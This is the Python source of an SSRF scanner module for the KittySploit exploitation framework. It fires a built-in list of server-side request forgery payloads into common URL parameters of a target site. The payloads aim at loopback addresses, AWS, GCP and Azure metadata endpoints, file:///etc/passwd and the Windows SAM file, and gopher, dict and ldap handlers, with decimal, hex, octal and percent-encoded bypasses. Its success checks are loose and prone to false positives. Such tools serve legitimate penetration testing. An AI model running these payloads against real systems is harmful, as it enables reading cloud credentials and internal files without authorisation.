#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import time
import socket


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'SSRF Scanner',
        'description': 'Scans for Server-Side Request Forgery (SSRF) vulnerabilities including internal network access, cloud metadata endpoints, and protocol handlers',
        'author': 'KittySploit Team',
        'tags': ['web', 'ssrf', 'scanner', 'security', 'network'],
        'references': [
            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
            'https://portswigger.net/web-security/ssrf',
            'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
        ]
    }

    # SSRF test URLs
    SSRF_PAYLOADS = [
        # Internal IPs
        'http://127.0.0.1',
        'http://127.0.0.1:80',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:3000',
        'http://localhost',
        'http://localhost:80',
        'http://localhost:8080',
        'http://0.0.0.0',
        'http://[::1]',
        
        # Cloud metadata endpoints
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/user-data/',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://metadata.azure.net/metadata/instance',
        
        # Protocol handlers
        'file:///etc/passwd',
        'file:///C:/windows/system32/config/sam',
        'gopher://127.0.0.1:80',
        'dict://127.0.0.1:80',
        'ldap://127.0.0.1:80',
        
        # Bypass techniques
        'http://127.0.0.1:80',
        'http://127.1.1.1',
        'http://2130706433',  # 127.0.0.1 in decimal
        'http://0x7f000001',  # 127.0.0.1 in hex
        'http://0177.0.0.1',  # 127.0.0.1 in octal
        'http://127.0.0.1.xip.io',
        'http://127.0.0.1.nip.io',
        
        # URL encoding
        'http://%31%32%37%2e%30%2e%30%2e%31',  # 127.0.0.1
        'http://%6c%6f%63%61%6c%68%6f%73%74',  # localhost
    ]

    # Parameter names commonly used for URLs
    URL_PARAMS = [
        'url', 'uri', 'link', 'path', 'file', 'src', 'source',
        'redirect', 'redirect_to', 'redirect_uri', 'return',
        'callback', 'callback_url', 'webhook', 'webhook_url',
        'api', 'api_url', 'endpoint', 'endpoint_url',
        'image', 'image_url', 'picture', 'picture_url',
        'fetch', 'fetch_url', 'load', 'load_url',
    ]

    def check(self):
        """
        Check if the target is accessible
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response and response.status_code in [200, 301, 302, 403, 404, 401]:
                return True
            return False
        except Exception as e:
            return False

    def test_ssrf_payload(self, payload, param_name='url', method='GET'):
        """
        Test an SSRF payload
        
        Args:
            payload: The SSRF payload to test
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                # URL encode the payload
                encoded_payload = urllib.parse.quote(payload, safe=':/?#[]@!$&\'()*+,;=')
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False,
                    timeout=10
                )
                elapsed_time = time.time() - start_time
            else:
                # POST request
                post_data = {param_name: payload}
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False,
                    timeout=10
                )
                elapsed_time = time.time() - start_time

            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}

            # Analyze response for SSRF indicators
            is_vulnerable = False
            indicators = []
            ssrf_type = None

            # Check for internal IP responses
            internal_ips = ['127.0.0.1', 'localhost', '0.0.0.0', '::1']
            response_text = response.text.lower()
            
            for ip in internal_ips:
                if ip in response_text:
                    is_vulnerable = True
                    ssrf_type = 'Internal network access'
                    indicators.append(f'Internal IP detected: {ip}')
                    break

            # Check for cloud metadata
            metadata_indicators = [
                'instance-id', 'ami-id', 'instance-type',
                'availability-zone', 'public-ipv4', 'local-ipv4',
                'computeMetadata', 'metadata.azure.net',
                'ec2-metadata', 'aws', 'azure', 'gcp',
            ]
            
            for indicator in metadata_indicators:
                if indicator in response_text:
                    is_vulnerable = True
                    ssrf_type = 'Cloud metadata access'
                    indicators.append(f'Cloud metadata detected: {indicator}')
                    break

            # Check for file:// protocol response
            if 'file://' in payload.lower():
                if 'root:' in response_text or 'bin/bash' in response_text:
                    is_vulnerable = True
                    ssrf_type = 'File protocol access'
                    indicators.append('File protocol access detected (/etc/passwd)')

            # Check for error messages that reveal SSRF
            ssrf_errors = [
                'connection refused', 'connection timeout',
                'no route to host', 'network is unreachable',
                'name or service not known', 'temporary failure',
                'connection reset', 'socket', 'tcp',
            ]
            
            for error in ssrf_errors:
                if error in response_text:
                    is_vulnerable = True
                    if not ssrf_type:
                        ssrf_type = 'Network error (possible SSRF)'
                    indicators.append(f'Network error: {error}')
                    break

            # Check response time (might indicate internal network access)
            if elapsed_time > 2 and '127.0.0.1' in payload or 'localhost' in payload:
                indicators.append(f'Delayed response: {elapsed_time:.2f}s (possible internal network)')

            # Check for protocol handler responses
            if 'gopher://' in payload.lower() or 'dict://' in payload.lower():
                if response.status_code not in [400, 404]:
                    is_vulnerable = True
                    ssrf_type = 'Protocol handler access'
                    indicators.append('Protocol handler may be supported')

            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'ssrf_type': ssrf_type,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time,
                'response_length': len(response.text)
            }

        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the SSRF scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting SSRF scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for SSRF vulnerabilities...")
        print_info("")
        
        for param in self.URL_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.SSRF_PAYLOADS[:15], 1):  # Test first 15 payloads per param
                result = self.test_ssrf_payload(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential SSRF found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Type: {result.get('ssrf_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info(f"      Status Code: {result.get('status_code')}")
                    if result.get('response_time'):
                        print_info(f"      Response Time: {result.get('response_time'):.2f}s")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for SSRF vulnerabilities...")
        print_info("")
        
        for param in self.URL_PARAMS[:10]:  # Test first 10 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.SSRF_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_ssrf_payload(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential SSRF found (POST)!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Type: {result.get('ssrf_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("SSRF Scan Summary")
        print_status("=" * 60)
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("SSRF vulnerabilities detected:")
            print_info("")
            
            # Group by SSRF type
            by_type = {}
            for vuln in self.vulnerabilities:
                ssrf_type = vuln.get('ssrf_type', 'Unknown')
                if ssrf_type not in by_type:
                    by_type[ssrf_type] = []
                by_type[ssrf_type].append(vuln)
            
            for ssrf_type, vulns in by_type.items():
                print_info(f"{ssrf_type} ({len(vulns)} found):")
                table_data = []
                for vuln in vulns[:10]:  # Show first 10 per type
                    payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                    indicators = ', '.join(vuln.get('indicators', [])[:1])
                    table_data.append([
                        vuln.get('param', 'N/A'),
                        vuln.get('method', 'GET'),
                        payload_short,
                        indicators
                    ])
                
                if table_data:
                    print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
                print_info("")
            
            print_warning("IMPORTANT: These are potential SSRF vulnerabilities. Manual verification is required.")
        else:
            print_info("No SSRF vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
        
        return True
